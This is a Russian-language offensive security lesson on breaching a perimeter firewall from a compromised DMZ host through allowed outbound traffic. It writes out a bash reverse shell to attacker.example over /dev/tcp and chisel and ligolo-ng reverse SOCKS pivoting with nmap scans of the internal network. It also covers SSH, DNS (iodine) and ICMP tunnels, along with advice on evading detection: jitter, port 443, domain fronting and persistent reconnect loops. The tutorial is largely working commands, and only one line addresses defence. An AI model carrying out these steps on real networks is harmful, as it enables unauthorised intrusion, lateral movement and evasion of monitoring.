## Вопрос, с которого всё начинается

У тебя есть выполнение кода на хосте `10.10.5.20` в DMZ. Ты поднял на нём слушатель и хочешь подключиться снаружи — но firewall блокирует входящие. Обратное тоже не выходит: прямой канал «наружу к тебе» не открывается.

Вопрос урока: как пробить периметр, если **входящие запрещены**, а исходящие — разрешены. Ответ строится на одном факте: firewall обычно асимметричен, и этим можно пользоваться.

## Наш пример: bind-shell не проходит

Сначала — наивная попытка. На хосте слушаем порт:

```
10.10.5.20$ nc -lvnp 4444
listening on [any] 4444 ...
```

А снаружи пробуем подключиться:

```
$ nc -vz 203.0.113.10 4444
nc: connect to 203.0.113.10 port 4444 (tcp) failed: Connection timed out
```

Таймаут. Входящие соединения к DMZ закрыты — bind-shell бесполезен.

## Шаг 1: разведка egress-политики

Прежде чем строить канал, выясняем, **что вообще разрешено наружу**. Слепое тыканье портов тратит время и шумит.

```
$ curl -m5 -k https://attacker.example/ -o /dev/null -w '%{http_code}\n'
200
$ dig @8.8.8.8 example.com +short
93.184.216.34
$ nc -vz -w3 attacker.example 22
nc: connect to attacker.example port 22 (tcp) failed: Connection refused
```

HTTPS и DNS ходят, SSH — нет. Значит, наш канал должен выглядеть как HTTP(S) на порт 443. Firewall обычно **запрещает входящие**, но **разрешает исходящие** — иначе не работали бы браузеры, обновления и API. Это и есть главный союзник.

## Шаг 2: reverse-shell

Разворачиваем направление: цель **сама** подключается к нам по разрешённому каналу.

```
# на нашей машине (attacker):
$ nc -lvnp 443
listening on [any] 443 ...

# на хосте жертвы:
10.10.5.20$ bash -i >& /dev/tcp/attacker.example/443 0>&1
```

`/dev/tcp/attacker.example/443` — встроенное в bash перенаправление: оно открывает TCP-соединение наружу и привязывает к нему интерактивный shell. У нас появляется «тупой» терминал. Стабилизируем его:

```
10.10.5.20$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

«Тупой» shell ломает job control, редакторы и Ctrl-C, поэтому стабилизация обязательна перед серьёзной работой.

## Шаг 3: reverse SOCKS через chisel

Одноразовый shell неудобен для сканирования. `chisel` поднимает **reverse SOCKS-прокси** поверх HTTP(S): сервер у нас, клиент — на жертве.

```
# attacker:
$ ./chisel server -p 443 --reverse --socks5
2026/10/12 12:00:00 server: Listening on https://0.0.0.0:443

# жертва (обратное подключение):
10.10.5.20$ ./chisel client https://attacker.example:443 R:socks
2026/10/12 12:00:05 client: Connected (Latency 38ms)
2026/10/12 12:00:05 client: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Теперь на нашей машине слушает локальный SOCKS5-прокси `127.0.0.1:1080`, и через него видно внутреннюю сеть жертвы.

## Шаг 4: pivot внутрь сети

Через SOCKS-прокси сканируем то, что было недоступно напрямую:

```
$ proxychains4 -q nmap -sT -Pn -p22,445,3389 10.10.10.0/24
PORT     STATE SERVICE
10.10.10.20 22/tcp open ssh
10.10.10.20 445/tcp open microsoft-ds
$ proxychains4 -q curl http://10.10.10.20:8080/
```

Каждый успешный хост становится новой точкой выхода: с него поднимается ещё один reverse-канал, и периметр «расползается» внутрь. Это и есть **pivoting** — движение вглубь через уже скомпрометированный узел.

## Шаг 5: выбор канала по ситуации

Инструмент выбирается по тому, что разрешено наружу:

| Разрешено наружу | Инструмент | Тип туннеля |
|------------------|------------|-------------|
| HTTP(S) | chisel, ligolo-ng | SOCKS/TUN |
| SSH | `ssh -R`/`-D` | SOCKS/forward |
| только DNS | iodine, dnscat2 | DNS |
| только ICMP | ptunnel | TCP-over-ICMP |
| ничего | соц. инженерия / USB | — |

`ssh -R 8080:127.0.0.1:8080 user@attacker` — это тоже reverse: внутренний сервис «выставляется» на нашей машине, хотя входящие к цели закрыты. DNS/ICMP-каналы медленные (десятки-сотни КБ/с), но проходят там, где больше ничего нет.

## SSH-туннели: три режима

SSH — самый «легальный» канал: он почти всегда разрешён наружу и не вызывает подозрений.

```
$ ssh -N -L 8080:10.10.10.20:80 user@jump        # локальный: внутренний сервис к себе
$ ssh -N -R 8080:127.0.0.1:8080 user@attacker    # обратный: свой сервис наружу
$ ssh -N -D 1080 user@jump                        # динамический SOCKS
```

`-L` открывает порт локально и ведёт к цели глазами `jump`; `-R` — обратный проброс. Комбинация `-R` + `-D` даёт reverse-SOCKS одним инструментом. Добавляй `-o ServerAliveInterval=30 -o ExitOnForwardFailure=yes`, чтобы туннель сам восстанавливался и не «висел» молча.

## ligolo-ng и OPSEC

`ligolo-ng` поднимает TUN-интерфейс, поэтому работает прозрачно — без `proxychains` и ограничений `-sT`:

```
$ ./proxy -selfcert -laddr 0.0.0.0:11601
$ ./agent -connect attacker:11601 -ignore-cert
$ sudo ip route add 10.10.10.0/24 dev ligolo
$ nmap -sS -Pn 10.10.10.0/24
```

Детект туннеля смотрит на поведение: длительное соединение на нестандартный порт, стабильный поток в обе стороны, регулярные keepalive, TLS к домену без браузерного профиля. Чтобы снизить заметность — порт 443, похожий на легитимный домен, джиттер в таймингах, ограничение скорости.

## Стабилизация и надёжность канала

Канал, который тихо отваливается, хуже отсутствия канала. Основные приёмы:

- **Автопереподключение**: цикл `while true; do chisel ...; sleep 5; done` или systemd-юнит с `Restart=always`.
- **Мультиплексирование**: несколько туннелей (разные порты/протоколы) на случай блокировки.
- **Keepalive**: `ServerAliveInterval` в SSH, периодический health-check через туннель.
- **OPSEC**: не гнать объём через один канал, избегать всплесков, ломающих baseline.

Проверка живости туннеля — обязательная привычка: если канал «висит», а трафик молча уходит в никуда, ты потеряешь время. Простой health-check — периодический запрос через SOCKS/TUN к заведомо живому адресу. И помни про OPSEC: чем «шумнее» туннель — регулярные keepalive, нестандартный внешний порт, ровный поток, — тем легче его заметить по поведению.

## Когда разрешён только DNS или ICMP

Если egress закрыт до предела, остаются DNS и ICMP. Они медленные, но проходят там, где больше ничего нет.

**DNS-туннель** через `iodine`: сервер у нас, клиент на жертве, трафик выглядит как обычные DNS-запросы.

```
# attacker:
$ sudo iodined -f -c -P secret 10.0.0.1 tunnel.attacker.example
# жертва:
10.10.5.20$ sudo iodine -f -P secret tunnel.attacker.example
```

После поднятия канала на нашей стороне появляется виртуальный интерфейс `dns0` с адресом `10.0.0.1`, а клиент получает `10.0.0.2` — это полноценный IP-туннель поверх DNS. Пропускная способность — десятки-сотни КБ/с, зато firewall пропускает его как резолвинг.

**ICMP-туннель** через `ptunnel`: данные прячутся в payload echo-request. Обычный ping payload пуст, а здесь он несёт поток — в PCAP это видно как нестандартно крупные и частые ping.

Оба канала детектируются статистикой: длинные поддомены (DNS), крупные/частые ping (ICMP). Поэтому их используют как «последний рубеж», когда HTTPS и SSH недоступны.

## Чек-лист разведки egress

Слепое тыканье портов шумит и тратит время. Egress-политику снимают системно:

- **DNS** — `dig @8.8.8.8 example.com` (работает ли резолвинг наружу).
- **HTTP/HTTPS** — `curl -m5` к внешнему хосту (есть ли веб-выход).
- **Популярные порты** — `nc -vz -w3 host 22/80/443/8080` по одному, а не сканом.
- **ICMP** — `ping -c1 8.8.8.8` (разрешён ли ping).
- **Прокси** — проверь `HTTP_PROXY`/`HTTPS_PROXY`: часто выход есть только через корпоративный прокси, и его можно использовать.

Собрав карту, выбирай канал из таблицы Шага 5 — под то, что реально разрешено.

## Если не сработало

- **Канал рвётся через минуты.** Добавь автопереподключение (`systemd Restart=always`) и keepalive — «мёртвый» туннель хуже отсутствия.
- **SOCKS работает, но сканы пустые.** Проверь `-sT`: `proxychains` не пропускает raw-пакеты, SYN-скан молча ничего не вернёт.
- **HTTPS-канал блокируется по SNI.** Замаскируй домен под легитимный CDN или используй домен-фронт.
- **Ничего не проходит.** Значит, egress реально закрыт — переходи на DNS/ICMP или ищи другой хост.

## Что мы теперь знаем

- Firewall асимметричен: входящие запрещены, исходящие — обычно разрешены.
- Поэтому reverse-подключение проходит там, где bind-порт заблокирован.
- Перед атакой надо разведать egress (`curl`, `dig`, `nc`, `ping`).
- `chisel` даёт reverse SOCKS поверх HTTPS; через него идёт pivot внутрь.
- Shell нужно стабилизировать (`pty.spawn`), иначе терминал неполноценен.
- Egress-политику снимают системно: DNS, HTTPS, популярные порты, ICMP, прокси.
- Когда разрешён только DNS/ICMP — iodine/ptunnel дают медленный, но рабочий туннель.
- `ligolo-ng` даёт TUN-интерфейс — прозрачный pivot без `proxychains` и `-sT`.
- SOCKS пропускает только полные TCP-соединения: сканы — только `-sT`.
- Канал надо мониторить: health-check через туннель ловит «мёртвые» сессии до потери времени.
- Защита от пивота — egress-фильтрация и сегментация без маршрута внутрь.
- Перед выбором канала разведай egress: `HTTP_PROXY` часто даёт готовый выход.
- `-L` даёт локальный проброс, `-R` — обратный; комбинация `-R`+`-D` — reverse-SOCKS.

## Куда дальше

Мы пробили периметр через разрешённый HTTPS и развернули reverse SOCKS. Дальше разберём сами туннели подробнее: SSH-форвардинг, SOCKS/HTTP CONNECT и DNS/ICMP как транспорт. А пока запомни: **не ломай firewall — используй то, что он разрешает, в обратном направлении.**
